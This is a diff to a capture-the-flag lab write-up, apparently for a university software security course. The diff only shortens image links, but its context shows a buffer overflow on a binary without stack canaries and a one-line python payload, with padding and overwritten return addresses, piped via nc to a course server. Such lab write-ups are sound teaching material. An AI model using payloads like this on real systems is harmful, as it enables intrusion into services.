@@ -9,8 +9,8 @@ File `check.c` was compiled with no-canaries and `-no-pie`, and is running at `n
 
 ---
 
-![[IST/SSoF/CTF's/ist1117363/Lab5/Super Secure System/Images/Files.png]]
-![[IST/SSoF/CTF's/ist1117363/Lab5/Super Secure System/Images/Source.png]]
+![[Files.png]]
+![[Source.png]]
 
 The source code displays a classic mismatch between a safe read and an unsafe copy.
 
@@ -82,7 +82,7 @@ The final payload I made was:
 python3 -c "import sys; sys.stdout.buffer.write(b'A'*36 + b'\x04\xa0\x04\x08' + b'B'*4 + b'\xd9\x87\x04\x08')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 25155
 ```
 
-![[IST/SSoF/CTF's/ist1117363/Lab5/Super Secure System/Images/Flag.png]]
+![[Flag.png]]
 
 ## FLAG
 ```flag
